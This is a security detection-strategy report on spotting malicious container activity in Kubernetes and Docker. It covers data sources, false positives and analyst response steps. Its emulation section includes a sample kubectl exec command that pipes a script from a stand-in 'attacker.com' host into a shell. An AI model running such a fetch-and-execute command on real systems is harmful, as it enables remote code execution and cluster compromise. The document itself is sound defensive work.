# Alerting & Detection Strategy (ADS) Report

## Goal
Detect adversarial attempts to bypass security monitoring using containers by identifying anomalous container activities that suggest malicious behavior.

## Categorization
- **MITRE ATT&CK Mapping:** T1203 - Exploitation for Client Execution
- **Tactic / Kill Chain Phases:** Execution
- **Platforms:** Linux, Windows, macOS
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1203)

## Strategy Abstract
This detection strategy focuses on identifying unusual patterns of container activity that may indicate adversarial exploitation attempts. The approach utilizes data sources such as container orchestration logs (e.g., Kubernetes events), host-level process monitoring, and network traffic analysis to detect anomalies. Key patterns analyzed include unexpected resource consumption spikes, unauthorized image pulls, and suspicious inter-container communication.

## Technical Context
Adversaries exploit containers by executing malicious code that can evade traditional security measures. In real-world scenarios, adversaries often use container orchestration platforms like Kubernetes to deploy hidden or disguised workloads. They may abuse misconfigurations or leverage privileged containers to escalate privileges on host systems.

### Adversary Emulation Details:
- **Sample Commands:** 
  - Launching a malicious Docker image: `docker run --rm -d mymaliciousimage`
  - Executing unauthorized scripts within Kubernetes pods: `kubectl exec <pod-name> -- /bin/sh -c 'curl http://attacker.com/malware.sh | sh'`

## Blind Spots and Assumptions
- **Limitations:** The strategy may not detect highly sophisticated evasion techniques that mimic benign container behavior.
- **Assumptions:** It assumes that standard monitoring tools are in place and configured to capture relevant logs and metrics.

## False Positives
Potential false positives include:
- Legitimate spikes in resource usage during peak operational times.
- Authorized, yet unusual, image pulls or pod deployments by trusted developers.
- Routine network communications between containers in microservices architectures.

## Priority
**High:** Containers are increasingly targeted due to their prevalence and the critical role they play in modern IT environments. Bypassing security monitoring can lead to significant data breaches and system compromises.

## Response
When an alert is triggered, analysts should:
1. Immediately isolate the affected container or pod.
2. Investigate logs for any unauthorized access or execution patterns.
3. Review network traffic associated with the container for signs of exfiltration.
4. Assess host-level impact and check for privilege escalation attempts.
5. Collaborate with development teams to understand recent changes that might explain anomalous behavior.
